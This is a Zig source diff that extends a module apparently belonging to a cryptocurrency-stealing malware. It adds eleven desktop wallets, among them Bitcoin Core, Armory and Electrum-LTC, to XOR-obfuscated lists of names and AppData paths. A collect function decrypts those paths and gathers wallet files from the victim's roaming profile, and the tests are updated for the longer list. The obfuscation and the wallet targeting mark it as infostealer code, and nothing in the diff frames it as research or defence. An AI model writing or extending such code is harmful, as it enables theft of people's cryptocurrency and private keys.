@@ -8,7 +8,7 @@ pub const DesktopWallet = struct {
 };
 
 const E = struct {
-    pub const names = [10][]const u8{
+    pub const names = [21][]const u8{
         &hash.xorEncrypt("Exodus"),
         &hash.xorEncrypt("Electrum"),
         &hash.xorEncrypt("Atomic"),
@@ -19,8 +19,19 @@ const E = struct {
         &hash.xorEncrypt("MultiBitHD"),
         &hash.xorEncrypt("Zcash"),
         &hash.xorEncrypt("Monero"),
+        &hash.xorEncrypt("Bitcoin Core"),
+        &hash.xorEncrypt("Litecoin Core"),
+        &hash.xorEncrypt("Dogecoin Core"),
+        &hash.xorEncrypt("Dash Core"),
+        &hash.xorEncrypt("Armory"),
+        &hash.xorEncrypt("Bytecoin"),
+        &hash.xorEncrypt("MultiDoge"),
+        &hash.xorEncrypt("ElectrumLTC"),
+        &hash.xorEncrypt("ElectronCash"),
+        &hash.xorEncrypt("Zcoin"),
+        &hash.xorEncrypt("BitcoinGold"),
     };
-    pub const paths = [10][]const u8{
+    pub const paths = [21][]const u8{
         &hash.xorEncrypt("Exodus\\exodus.wallet"),
         &hash.xorEncrypt("Electrum\\wallets"),
         &hash.xorEncrypt("atomic\\Local Storage\\leveldb"),
@@ -31,6 +42,17 @@ const E = struct {
         &hash.xorEncrypt("MultiBitHD"),
         &hash.xorEncrypt("Zcash"),
         &hash.xorEncrypt("monero-project\\monero-core\\wallets"),
+        &hash.xorEncrypt("Bitcoin"),
+        &hash.xorEncrypt("Litecoin"),
+        &hash.xorEncrypt("DogeCoin"),
+        &hash.xorEncrypt("DashCore"),
+        &hash.xorEncrypt("Armory"),
+        &hash.xorEncrypt("bytecoin"),
+        &hash.xorEncrypt("MultiDoge"),
+        &hash.xorEncrypt("Electrum-LTC"),
+        &hash.xorEncrypt("ElectronCash"),
+        &hash.xorEncrypt("Firo"),
+        &hash.xorEncrypt("BitcoinGold"),
     };
 };
 
@@ -72,7 +94,7 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8) ![]De
         wallets.deinit();
     }
 
-    inline for (0..10) |i| {
+    inline for (0..21) |i| {
         const pe = E.paths[i];
         var path_buf: [pe.len]u8 = undefined;
         hash.xorDecrypt(pe, &path_buf);
@@ -101,7 +123,7 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8) ![]De
 }
 
 test "desktop wallet count" {
-    try std.testing.expect(E.names.len == 10);
+    try std.testing.expect(E.names.len == 21);
 }
 
 test "first desktop wallet is Exodus" {
@@ -110,10 +132,10 @@ test "first desktop wallet is Exodus" {
     try std.testing.expectEqualSlices(u8, "Exodus", &buf);
 }
 
-test "last desktop wallet is Monero" {
-    var buf: [E.names[9].len]u8 = undefined;
-    hash.xorDecrypt(E.names[9], &buf);
-    try std.testing.expectEqualSlices(u8, "Monero", &buf);
+test "last desktop wallet is BitcoinGold" {
+    var buf: [E.names[20].len]u8 = undefined;
+    hash.xorDecrypt(E.names[20], &buf);
+    try std.testing.expectEqualSlices(u8, "BitcoinGold", &buf);
 }
 
 test "collect returns empty for nonexistent roaming" {
